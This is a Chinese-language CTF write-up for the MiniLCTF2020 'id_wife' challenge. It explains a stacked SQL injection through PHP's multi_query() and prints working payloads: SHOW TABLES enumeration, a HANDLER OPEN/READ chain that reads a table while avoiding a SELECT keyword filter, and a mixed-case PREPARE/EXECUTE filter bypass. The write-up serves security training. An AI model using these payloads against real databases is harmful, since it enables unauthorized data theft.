# MiniLCTF2020 - id_wife

## 题目简述

服务端把 POST 参数 `id` 直接拼进 MySQL 查询，并使用 `mysqli::multi_query()` 执行，因此可以进行堆叠注入。过滤器拦截了 `select`、`where`、`alter`、`rename` 等常见关键字，还用区分大小写的 `strstr()` 检查 `execute`、`prepare` 和 `deallocate`。核心是避开这些词仍然读取未知表。

## 解题过程

原查询为：

```php
$sql = "select * from user where id=('$id')";
$conn->multi_query($sql);
```

先闭合括号并利用允许的 `SHOW TABLES` 枚举表名：

```text
w1nd');SHOW TABLES;#
```

回显中除 `user` 外还有数字表名 `1145141919810`。由于 `HANDLER` 语句不需要出现被禁的 `SELECT`，可以打开表并顺序读取记录；纯数字表名用反引号包裹：

```text
w1nd');HANDLER `1145141919810` OPEN;HANDLER `1145141919810` READ FIRST;HANDLER `1145141919810` READ NEXT;#
```

应用会依次取出每个结果集并 `var_dump()`，因此 flag 会随目标表记录直接出现在响应中。另一条可行思路是把 `select` 拆成 `CONCAT('se','lect ...')`，并用 `Prepare`、`EXECUTE` 的大小写绕过 `strstr()`；不过 `HANDLER` 链更短，也不依赖动态 SQL。

原参赛记录中的 UUID flag 属于当时实例数据，复现时应以当前目标表回显为准。

## 方法总结

判断 SQL 注入可利用面时要同时看执行 API 和过滤方式：`multi_query()` 把普通注入升级成堆叠注入；关键字黑名单并不会覆盖 `SHOW`、`HANDLER` 等替代语法。MySQL `HANDLER ... OPEN/READ` 是在 `SELECT` 被禁时直接读表的常见旁路。
